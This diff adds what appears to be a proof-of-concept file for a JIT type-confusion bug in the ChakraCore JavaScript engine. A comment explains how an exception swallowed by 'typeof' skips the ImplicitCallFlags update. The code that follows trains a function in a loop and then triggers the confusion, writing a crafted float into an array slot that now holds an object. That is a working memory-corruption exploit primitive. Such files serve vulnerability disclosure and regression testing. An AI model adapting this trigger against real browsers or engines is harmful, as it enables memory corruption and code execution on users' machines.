@@ -1,0 +1,49 @@
+/*
+Here's a snippet of ExecuteImplicitCall which is responsible for updating the ImplicitCallFlags flag.
+    template <class Fn>
+    inline Js::Var ExecuteImplicitCall(Js::RecyclableObject * function, Js::ImplicitCallFlags flags, Fn implicitCall)
+    {
+        ...
+        Js::ImplicitCallFlags saveImplicitCallFlags = this->GetImplicitCallFlags();
+        Js::Var result = implicitCall();
+        this->SetImplicitCallFlags((Js::ImplicitCallFlags)(saveImplicitCallFlags | flags));
+        return result;
+    }
+
+It updates the flag after the implicit call. So if an exception is thrown during the implicit call, the flag will remain not updated. And the execution will be broken until the exeception gets handled. Namely, if we can ignore the exception in any way, we can bypass the ImplicitCallFlags checks.
+
+At this point, "typeof" comes to rescue. The weird handler for "typeof" catchs execptions and clears them. For example, in the following code, the exeception thrown from toString will be ignored.
+
+let o = {
+    toString: () => {
+        throw 1;
+    }
+};
+
+typeof(this[o]);
+
+So, we can bypass the ImplicitCallFlags checks by throwing an exception and clearing it using "typeof".
+*/
+
+function opt(arr, index) {
+    arr[0] = 1.1;
+    typeof(arr[index]);
+    arr[0] = 2.3023e-320;
+}
+
+function main() {
+    let arr = [1.1, 2.2, 3.3];
+    for (let i = 0; i < 0x10000; i++) {
+        opt(arr, {});
+    }
+
+    opt(arr, {toString: () => {
+        arr[0] = {};
+
+        throw 1;
+    }});
+
+    print(arr[0]);
+}
+
+main();
